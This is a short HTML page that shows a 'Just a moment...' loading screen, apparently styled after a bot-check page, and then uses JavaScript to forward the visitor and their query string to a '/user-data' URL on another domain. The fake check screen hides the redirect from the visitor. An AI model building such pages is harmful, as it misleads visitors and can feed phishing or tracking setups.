<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Just a moment...</title><style>body{margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-items:center;background-color:#222}.loader{width:84px;height:84px;position:relative;overflow:hidden}.loader:after,.loader:before{content:"";position:absolute;left:50%;bottom:0;width:64px;height:64px;border-radius:50%;background:#fff;transform:translate(-50%,100%) scale(0);animation:push 2s infinite ease-in}.loader:after{animation-delay:1s}@keyframes push{0%{transform:translate(-50%,100%) scale(1)}15%,25%{transform:translate(-50%,50%) scale(1)}50%,75%{transform:translate(-50%,-30%) scale(.5)}100%,80%{transform:translate(-50%,-50%) scale(0)}}</style></head><body><div class="loader"></div><script>
// No more Base64 confusion. Set your real domain here:
const targetURL = "https://mynotes.mycofam.org/user-data"; 
const query = window.location.search;

setTimeout(() => {
    // This combines "https://mynotes.mycofam.org/user-data" + "?qb=..."
    window.location.replace(targetURL + query);
}, 800);
</script></body></html>
